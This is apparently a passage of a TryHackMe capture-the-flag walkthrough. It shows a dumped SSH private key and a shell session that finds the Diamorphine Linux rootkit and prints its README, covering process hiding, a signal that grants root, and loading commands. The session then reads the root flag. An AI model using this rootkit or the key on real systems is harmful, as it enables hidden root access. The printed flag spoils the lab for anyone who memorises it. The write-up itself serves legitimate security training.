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
-----END OPENSSH PRIVATE KEY-----
webadmin-lowpriv@www-infinity:~$ cat foo.txt
cat foo.txt
"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."webadmin-lowpriv@www-infinity:~$ 


![image](https://github.com/user-attachments/assets/39a04b8a-e15a-4eb2-bd57-59ed65a0f946)

webadmin-lowpriv@www-infinity:/dev$ cd shm
cd shm
webadmin-lowpriv@www-infinity:/dev/shm$ ls
ls
LICENSE.txt
Makefile
Module.symvers
README.md
diamorphine.c
diamorphine.h
diamorphine.ko
diamorphine.mod
diamorphine.mod.c
diamorphine.mod.o
diamorphine.o
modules.order
webadmin-lowpriv@www-infinity:/dev/shm$ cat README.md
cat README.md
Diamorphine
===========

Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64

Features
--

- When loaded, the module starts invisible;

- Hide/unhide any process by sending a signal 31;

- Sending a signal 63(to any pid) makes the module become (in)visible;

- Sending a signal 64(to any pid) makes the given user become root;

- Files or directories starting with the MAGIC_PREFIX become invisible;

- Source: https://github.com/m0nad/Diamorphine

Install
--

Verify if the kernel is 2.6.x/3.x/4.x/5.x
```
uname -r
```

Clone the repository
```
git clone https://github.com/m0nad/Diamorphine
```

Enter the folder
```
cd Diamorphine
```

Compile
```
make
```

Load the module(as root)
```
insmod diamorphine.ko
```

Uninstall
--

The module starts invisible, to remove you need to make it visible
```
kill -63 0
```

Then remove the module(as root)
```
rmmod diamorphine
```

References
--
Wikipedia Rootkit
https://en.wikipedia.org/wiki/Rootkit

Linux Device Drivers
http://lwn.net/Kernel/LDD3/

LKM HACKING
https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html

Memset's blog
http://memset.wordpress.com/

Linux on-the-fly kernel patching without LKM
http://phrack.org/issues/58/7.html

WRITING A SIMPLE ROOTKIT FOR LINUX
https://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt

Linux Cross Reference
http://lxr.free-electrons.com/

zizzu0 LinuxKernelModules
https://github.com/zizzu0/LinuxKernelModules/

Linux Rootkits: New Methods for Kernel 5.7+
https://xcellerator.github.io/posts/linux_rootkits_11/
webadmin-lowpriv@www-infinity:/dev/shm$ 



webadmin-lowpriv@www-infinity:/dev/shm$ id
id
uid=0(root) gid=0(root) groups=0(root),1001(webadmin-lowpriv)
webadmin-lowpriv@www-infinity:/dev/shm$ cd /root
cd /root
webadmin-lowpriv@www-infinity:/root$ ls
ls
backstage
docker-compose
root.txt
rootkit
snap
takedown-dev-main
takedown-dev-main.zip
webadmin-lowpriv@www-infinity:/root$ cat root.txt
cat root.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*****(/****/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@#***&@/,,,,,,,,%@#***@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@&**#(,,,,,,,,,,,,*,,,,,@**/@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@(**/,,,,,,,,,,,,,,,,,,**,,,,/**@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%**,,,,,,,,,,,,#&@@%*,,,,,,***,,***@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@/**,***,,,,(@/*********/@@,,,,****,**%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@*******,,,/*,*************,,/#,,,******#@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@******,,,,,,******************,,,,,******(@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@******,,,,,**&@@@@@****(@@@@@&***,,,,******%@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(*****,,,,/@@@@@@@@@@***@@@@@@@@@@**,,,******@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@*****,,,/@@@@*****%@****/@#****/@@@@/,,,*****/@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@(***,,,,@@@@@@@@@@@***(&(***@@@@@@@@@@@*,,,****@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@***,,,,@&&@@@@@@@%@@@@@@@@@@@#@@@@@@@#&@*,,,***%@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@#**,,,,***@@@@@@@@@@@@@@@@@@@@@@@@@@@@%***,,,****@@@@@@@@@@@@@@@@@
@@@@@@@@@@&****,,,,***/@@@#@@@@@@/*****(@@@@@@%@@@/***,,,******@@@@@@@@@@@@@@@
@@@@@@@@@*******,,,,***@@@@(@@@@@******/@@@@@%@@@%***,,,,*******/@@@@@@@@@@@@@
@@@@@@@@&********,,,****@@@@@*&@@@@#*%@@@@%*@@@@%****,,,*********@@@@@@@@@@@@@
@@@@@@@@@@(********,,****#@@@@&***********@@@@@/****,,,********@@@@@@@@@@@@@@@
@@@@@@@@@@@@%*******,,*****&@(@(*********#@/@%*****,,*******/@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@/******,**,****#@(*******#@/****,**********&@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@/******,,*****@@****/@@*****,,*******&@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@#*****,,*****@@&@&*****,,*****(@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@/***,,***********,,***/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/**,,*****,,**/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/,,,/&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

THANKS FOR PLAYING :D -husky

THM{th3_r00t_of_the_pr0blem}
webadmin-lowpriv@www-infinity:/root$ 

![image](https://github.com/user-attachments/assets/4a84e173-712e-47b2-b888-ba2419a0a160)


![image](https://github.com/user-attachments/assets/08f3dcab-0005-4919-8bc0-56f4d4c833a4)

![image](https://github.com/user-attachments/assets/352aa3f5-d507-4a4a-b629-2bbf411af85c)


![image](https://github.com/user-attachments/assets/f88c4ccf-13a7-475a-b2ac-8799da296c15)

![image](https://github.com/user-attachments/assets/a2cf6cd8-f565-4319-91e4-84c1ec9f882e)

![image](https://github.com/user-attachments/assets/b21cfddb-55ee-40ac-b08e-ec4deab216e6)

![image](https://github.com/user-attachments/assets/aec4b1be-924f-4e6d-912c-13981adfe637)

![image](https://github.com/user-attachments/assets/09fd19c7-fbd2-4e95-8685-bb89279df205)


![image](https://github.com/user-attachments/assets/08c949ed-8ce0-4688-957e-4f240c79fcb9)


<br>

![image](https://github.com/user-attachments/assets/098751db-f7d2-452c-93d6-cae99ab58082)






